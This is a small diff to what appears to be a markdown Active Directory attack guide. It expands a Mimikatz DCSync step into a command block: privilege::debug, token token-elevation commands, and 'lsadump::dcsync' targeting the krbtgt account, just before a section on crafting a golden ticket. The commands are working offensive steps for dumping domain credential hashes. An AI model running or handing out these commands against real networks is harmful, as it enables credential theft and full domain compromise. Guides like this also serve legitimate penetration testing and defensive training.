@@ -258,7 +258,12 @@ Download `PsExec` (https://learn.microsoft.com/en-us/sysinternals/downloads/psex
 
 Use *Mimikatz* with Replication Account to perform a DCSync attack and get NTLM hashes.
 
-`lsadump::dcsync /domain:xyz.com /user:krbtgt`
+```
+privilege::debug
+token::whoami
+token::elevate
+lsadump::dcsync /domain:xyz.com /user:krbtgt
+```
 
 ### Craft Golden Ticket (Should be run within a Workstation)
 
